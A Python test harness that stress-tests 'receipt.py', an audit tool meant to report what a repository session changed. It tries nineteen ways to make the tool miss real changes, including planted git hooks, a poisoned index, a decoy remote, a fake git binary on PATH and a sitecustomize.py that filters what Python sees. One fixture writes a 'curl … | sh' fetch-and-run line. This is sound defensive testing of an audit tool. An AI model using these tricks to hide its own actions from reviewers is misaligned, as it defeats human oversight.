#!/usr/bin/env python3
"""Try to make receipt.py say "nothing happened" while something did.

Each attack runs in a throwaway workshop: a bare repo standing in for GitHub and a clone.
The session is the attack. Afterwards an oracle (plain git or the filesystem, using the
real git binary) reports what actually changed. FOOLED means: the receipt listed no
changes, verify passed with an anchored fingerprint, and the oracle shows a real change.
"""

import argparse
import hashlib
import importlib.util
import json
import os
import shutil
import subprocess
import sys
import tempfile
from pathlib import Path

os.environ["GIT_CONFIG_GLOBAL"] = os.devnull
os.environ["GIT_CONFIG_NOSYSTEM"] = "1"
for key in [k for k in os.environ if k.startswith("GIT_CONFIG_")]:
    if key not in ("GIT_CONFIG_GLOBAL", "GIT_CONFIG_NOSYSTEM"):
        del os.environ[key]

REAL_GIT = shutil.which("git")


def sh(*args, cwd=None):
    return subprocess.run([str(a) for a in args], cwd=cwd, check=True,
                          capture_output=True, text=True).stdout.strip()


class Workshop:
    def __init__(self, root):
        self.root = root
        self.remote = root / "remote.git"
        self.work = root / "work"
        sh(REAL_GIT, "init", "-q", "--bare", "-b", "main", self.remote)
        sh(REAL_GIT, "init", "-q", "-b", "main", self.work)
        self.git("config", "user.name", "tester")
        self.git("config", "user.email", "tester@example.invalid")
        self.write("README.md", "hello\n")
        self.git("add", "README.md")
        self.git("commit", "-q", "-m", "initial")
        self.write("notes.txt", "untracked draft\n")
        self.git("remote", "add", "origin", self.remote)
        self.git("push", "-q", "-u", "origin", "main")
        self.start = self.git("rev-parse", "HEAD")

    def git(self, *args):
        return sh(REAL_GIT, *args, cwd=self.work)

    def write(self, rel, text):
        path = self.work / rel
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text)

    def human_commits_one_file(self):
        self.write("human.txt", "the human's own work\n")
        self.git("add", "human.txt")
        self.git("commit", "-q", "-m", "human work")


def session(ws, tool, act):
    before = tool.snapshot(ws.work, "origin")
    anchor = tool.fingerprint(before)
    act()
    r = tool.make_receipt(before, tool.snapshot(ws.work, "origin"))
    return r["changes"], tool.verify(r, tool.snapshot(ws.work, "origin"), anchor)


def outcome(changes, problems, reality, evidence):
    return {"receipt_saw": sorted(changes), "verify_ok": not problems,
            "reality_changed": bool(reality), "evidence": evidence}


# --- hidden inside the repository ------------------------------------------------------

def planted_hook(ws, tool):
    hook = ws.work / ".git" / "hooks" / "pre-commit"

    def act():
        hook.write_text('#!/bin/sh\necho "planted hook ran" > ../hook-ran.txt\n')
        hook.chmod(0o755)

    changes, problems = session(ws, tool, act)
    ws.human_commits_one_file()
    ran = (ws.root / "hook-ran.txt").exists()
    return outcome(changes, problems, ran, "the human's next commit ran the planted hook" if ran else "hook did not run")


def excluded_file(ws, tool):
    def act():
        with open(ws.work / ".git" / "info" / "exclude", "a") as f:
            f.write("payload.bin\n")
        ws.write("payload.bin", "anything\n")

    changes, problems = session(ws, tool, act)
    seen = "!! payload.bin" in ws.git("status", "--porcelain", "--ignored")
    return outcome(changes, problems, seen, "payload.bin exists; git status --ignored lists it")


def ordinary_gitignore(ws, tool):
    """No malice needed: most projects ignore exactly the files that hold secrets."""
    ws.write(".gitignore", ".env\n")
    ws.git("add", ".gitignore")
    ws.git("commit", "-q", "-m", "ignore .env")
    changes, problems = session(ws, tool, lambda: ws.write(".env", "GITHUB_TOKEN=ghp_example\n"))
    seen = "!! .env" in ws.git("status", "--porcelain", "--ignored")
    return outcome(changes, problems, seen, ".env with a token now exists; git status --ignored lists it")


def poisoned_index(ws, tool):
    def act():
        ws.write("README.md", "malicious\n")
        ws.git("add", "README.md")
        ws.write("README.md", "hello\n")

    changes, problems = session(ws, tool, act)
    ws.human_commits_one_file()
    committed = ws.git("show", "HEAD:README.md")
    return outcome(changes, problems, committed == "malicious",
                   f"the human's next commit contains README.md = {committed!r}")


def executable_bit(ws, tool):
    changes, problems = session(ws, tool, lambda: (ws.work / "README.md").chmod(0o755))
    summary = ws.git("diff", "--summary")
    return outcome(changes, problems, "mode change" in summary, summary or "no mode change")


def nested_repository(ws, tool):
    def act():
        sh(REAL_GIT, "init", "-q", ws.work / "vendor")
        ws.write("vendor/run.sh", "curl https://example.invalid/x | sh\n")

    changes, problems = session(ws, tool, act)
    status = ws.git("status", "--porcelain")
    return outcome(changes, problems, "vendor/" in status, "git status: " + status.replace("\n", " | "))


def symlinks(ws, tool):
    def act():
        os.symlink("/", ws.work / "rootlink")
        os.symlink(ws.root / "not-there-yet", ws.work / "payload-link")

    changes, problems = session(ws, tool, act)
    status = ws.git("status", "--porcelain")
    return outcome(changes, problems, "rootlink" in status and "payload-link" in status,
                   "git status: " + status.replace("\n", " | "))


# --- the remote ---------------------------------------------------------------------

def swapped_remote_url(ws, tool):
    decoy = ws.root / "decoy.git"

    def act():
        sh(REAL_GIT, "clone", "-q", "--mirror", ws.remote, decoy)
        ws.write("secret.txt", "published\n")
        ws.git("add", "secret.txt")
        ws.git("commit", "-q", "-m", "publish")
        ws.git("push", "-q", "origin", "main")
        ws.git("reset", "-q", "--hard", ws.start)
        ws.git("update-ref", "refs/remotes/origin/main", ws.start)
        ws.git("remote", "set-url", "origin", decoy)

    changes, problems = session(ws, tool, act)
    real_main = sh(REAL_GIT, "ls-remote", ws.remote, "refs/heads/main").split()[0]
    return outcome(changes, problems, real_main != ws.start,
                   f"the real remote's main moved to {real_main[:7]}; origin now points at a decoy")


def pushed_elsewhere(ws, tool):
    elsewhere = ws.root / "elsewhere.git"
    sh(REAL_GIT, "init", "-q", "--bare", elsewhere)
    changes, problems = session(ws, tool, lambda: ws.git("push", "-q", elsewhere, "main:refs/heads/copy"))
    refs = sh(REAL_GIT, "-C", elsewhere, "for-each-ref")
    return outcome(changes, problems, "refs/heads/copy" in refs, "another repository now holds a copy of main")


def push_then_restore(ws, tool):
    pushed = {}

    def act():
        ws.write("secret.txt", "published for a moment\n")
        ws.git("add", "secret.txt")
        ws.git("commit", "-q", "-m", "briefly public")
        pushed["sha"] = ws.git("rev-parse", "HEAD")
        ws.git("push", "-q", "origin", "main")
        ws.git("push", "-q", "--force", "origin", f"{ws.start}:main")
        ws.git("reset", "-q", "--hard", ws.start)

    changes, problems = session(ws, tool, act)
    kept = subprocess.run([REAL_GIT, "cat-file", "-e", pushed["sha"]], cwd=ws.remote).returncode == 0
    return outcome(changes, problems, kept, "the remote still stores the briefly published commit")


# --- the procedure and the instrument ----------------------------------------------

def late_start(ws, tool):
    ws.write("README.md", "changed before the receipt began\n")
    ws.write("backdoor.sh", "#!/bin/sh\n")
    ws.git("add", "-A")
    ws.git("commit", "-q", "-m", "early work")
    changes, problems = session(ws, tool, lambda: None)
    stat = ws.git("diff", "--shortstat", ws.start)
    return outcome(changes, problems, bool(stat), f"since the commit the session really began from: {stat}")


def lying_tool(ws, tool):
    """The human runs the copy of receipt.py that lives in the repository, i.e. the actor's copy."""
    honest_path = Path(tool.__file__)
    honest_src = honest_path.read_text()
    honest_hash = hashlib.sha256(honest_path.read_bytes()).hexdigest()
    in_repo = ws.work / "receipt.py"
    in_repo.write_text(honest_src)

    def cli(*args):
        return subprocess.run([sys.executable, "-B", in_repo, "--repo", ws.work, *args],
                              capture_output=True, text=True)

    before_path, receipt_path = ws.root / "before.json", ws.root / "receipt.json"
    before_path.write_text(cli("snapshot").stdout)
    anchor = cli("fingerprint", before_path).stdout.strip()
    honest_entry = json.loads(before_path.read_text())["files"]["receipt.py"]

    ws.write("payload.txt", "anything\n")
    version_line = "TOOL_VERSION = hashlib.sha256(Path(__file__).read_bytes()).hexdigest()"
    lie = (f'    hashes.pop("payload.txt", None)\n'
           f'    hashes["receipt.py"] = "{honest_entry}"\n'
           f'    return hashes\n')
    if version_line not in honest_src or "    return hashes\n" not in honest_src:
        return {"not_applicable": "lying transform does not fit this tool's source"}
    in_repo.write_text(honest_src.replace(version_line, f'TOOL_VERSION = "{honest_hash}"')
                       .replace("    return hashes\n", lie, 1))

    receipt_path.write_text(cli("receipt", before_path).stdout)
    verified = cli("verify", receipt_path, "--before-fingerprint", anchor)
    changes = json.loads(receipt_path.read_text())["changes"]
    problems = [] if verified.returncode == 0 else [verified.stdout]
    truth = tool.snapshot(ws.work, "origin")["files"]
    return outcome(changes, problems, "payload.txt" in truth and truth["receipt.py"] != honest_entry,
                   "payload.txt was added and receipt.py itself was replaced")


FAKE_GIT = """#!{python}
import subprocess, sys
r = subprocess.run([{real!r}, *sys.argv[1:]], capture_output=True)
out = b"\\0".join(e for e in r.stdout.split(b"\\0") if b"payload" not in e)
out = b"\\n".join(line for line in out.split(b"\\n") if b"payload" not in line)
sys.stdout.buffer.write(out); sys.stderr.buffer.write(r.stderr); sys.exit(r.returncode)
"""


def fake_git_on_path(ws, tool):
    fakebin = ws.root / "fakebin"
    fakebin.mkdir()
    (fakebin / "git").write_text(FAKE_GIT.format(python=sys.executable, real=REAL_GIT))
    (fakebin / "git").chmod(0o755)
    old_path = os.environ["PATH"]

    def act():
        ws.write("payload.txt", "anything\n")
        os.environ["PATH"] = f"{fakebin}:{old_path}"

    try:
        changes, problems = session(ws, tool, act)
    finally:
        os.environ["PATH"] = old_path
    status = ws.git("status", "--porcelain")
    return outcome(changes, problems, "payload.txt" in status, "the real git sees payload.txt")


SITECUSTOMIZE = '''
import os, subprocess
_walk, _run = os.walk, subprocess.run
def walk(top, *a, **k):
    for dirpath, dirnames, filenames in _walk(top, *a, **k):
        yield dirpath, dirnames, [f for f in filenames if "payload" not in f]
def run(*a, **k):
    r = _run(*a, **k)
    if isinstance(r.stdout, str):
        r.stdout = "\\0".join(e for e in r.stdout.split("\\0") if "payload" not in e)
    return r
os.walk, subprocess.run = walk, run
'''


def poisoned_interpreter(ws, tool):
    """The human runs their own, unmodified copy of the tool, but in an environment the actor shaped."""
    def cli(*args, env=None):
        return subprocess.run([sys.executable, "-B", tool.__file__, "--repo", ws.work, *args],
                              capture_output=True, text=True, env=env)

    before_path, receipt_path = ws.root / "before.json", ws.root / "receipt.json"
    before_path.write_text(cli("snapshot").stdout)
    anchor = cli("fingerprint", before_path).stdout.strip()

    ws.write("payload.txt", "anything\n")
    inject = ws.root / "pyinject"
    inject.mkdir()
    (inject / "sitecustomize.py").write_text(SITECUSTOMIZE)
    shaped = {**os.environ, "PYTHONPATH": str(inject)}  # e.g. one line in a shell profile

    receipt_path.write_text(cli("receipt", before_path, env=shaped).stdout)
    verified = cli("verify", receipt_path, "--before-fingerprint", anchor, env=shaped)
    changes = json.loads(receipt_path.read_text())["changes"]
    problems = [] if verified.returncode == 0 else [verified.stdout]
    return outcome(changes, problems, "payload.txt" in ws.git("status", "--porcelain"),
                   "the human's own copy of the tool, run in a shaped environment; the real git sees payload.txt")


# --- things I expected the receipt to catch ---------------------------------------

def assume_unchanged(ws, tool):
    def act():
        ws.git("update-index", "--assume-unchanged", "README.md")
        ws.write("README.md", "edited behind git's back\n")

    changes, problems = session(ws, tool, act)
    clean = ws.git("status", "--porcelain", "--untracked-files=no") == ""
    differs = ws.git("hash-object", "README.md") != ws.git("rev-parse", "HEAD:README.md")
    return outcome(changes, problems, differs, f"git status looks clean: {clean}; content differs from HEAD: {differs}")


def replaced_history(ws, tool):
    def act():
        fake = ws.git("commit-tree", "HEAD^{tree}", "-m", "a history that never happened")
        ws.git("replace", "HEAD", fake)

    changes, problems = session(ws, tool, act)
    shown = ws.git("log", "-1", "--format=%s")
    return outcome(changes, problems, shown != "initial", f"git log now shows: {shown!r}")


def edited_untracked_file(ws, tool):
    changes, problems = session(ws, tool, lambda: ws.write("notes.txt", "rewritten\n"))
    return outcome(changes, problems, True, "git status shows '?? notes.txt' before and after, content differs")


def stashed_file(ws, tool):
    def act():
        ws.write("temp.txt", "tucked away\n")
        ws.git("stash", "push", "-q", "-u")

    changes, problems = session(ws, tool, act)
    return outcome(changes, problems, "stash@{0}" in ws.git("stash", "list"), "a stash exists")


def non_utf8_filename(ws, tool):
    def act():
        with open(os.fsencode(ws.work) + b"/payload-\xff", "wb") as f:
            f.write(b"anything\n")

    try:
        changes, problems = session(ws, tool, act)
    except UnicodeDecodeError as err:
        return {"loud_failure": f"the tool crashed ({type(err).__name__}) instead of reporting"}
    return outcome(changes, problems, True, "a file with a non-UTF-8 name was added")


ATTACKS = [
    # (id, attack, predicted before running: will the receipt be fooled?)
    ("A1", planted_hook, True),
    ("A2", excluded_file, True),
    ("A3", poisoned_index, True),
    ("A4", executable_bit, True),
    ("A5", nested_repository, True),
    ("A6", symlinks, True),
    ("A7", ordinary_gitignore, True),
    ("B1", swapped_remote_url, True),
    ("B2", pushed_elsewhere, True),
    ("B3", push_then_restore, True),
    ("C1", late_start, True),
    ("C2", lying_tool, True),
    ("C3", fake_git_on_path, True),
    ("C4", poisoned_interpreter, True),
    ("H1", assume_unchanged, False),
    ("H2", replaced_history, False),
    ("H3", edited_untracked_file, False),
    ("H4", stashed_file, False),
    ("H5", non_utf8_filename, False),
]


def load_tool(path):
    spec = importlib.util.spec_from_file_location("tool_under_attack", path)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--tool", default=Path(__file__).with_name("receipt.py"))
    parser.add_argument("--json")
    args = parser.parse_args()
    tool = load_tool(args.tool)

    rows = []
    for ident, attack, predicted in ATTACKS:
        with tempfile.TemporaryDirectory() as tmp:
            try:
                row = attack(Workshop(Path(tmp)), tool)
            except Exception as err:  # an attack that crashes is reported, not hidden
                row = {"error": f"{type(err).__name__}: {err}"}
        if "receipt_saw" in row:
            row["fooled"] = row["reality_changed"] and not row["receipt_saw"] and row["verify_ok"]
        rows.append({"id": ident, "attack": attack.__name__, "predicted_fooled": predicted, **row})

    for r in rows:
        if "fooled" not in r:
            label = "LOUD   " if "loud_failure" in r else "??     "
            detail = r.get("loud_failure") or r.get("error") or r.get("not_applicable")
            print(f"{r['id']} {r['attack']:<22} {label} {detail}")
            continue
        verdict = "FOOLED " if r["fooled"] else "caught "
        guess = "as predicted" if r["fooled"] == r["predicted_fooled"] else "PREDICTION WRONG"
        saw = ",".join(r["receipt_saw"]) or "nothing"
        print(f"{r['id']} {r['attack']:<22} {verdict} receipt saw: {saw:<22} [{guess}]  {r['evidence']}")
    fooled = sum(1 for r in rows if r.get("fooled"))
    real = sum(1 for r in rows if r.get("reality_changed"))
    print(f"\nfooled on {fooled} of {real} attacks where something really changed")
    if args.json:
        Path(args.json).write_text(json.dumps(rows, indent=2))


if __name__ == "__main__":
    main()
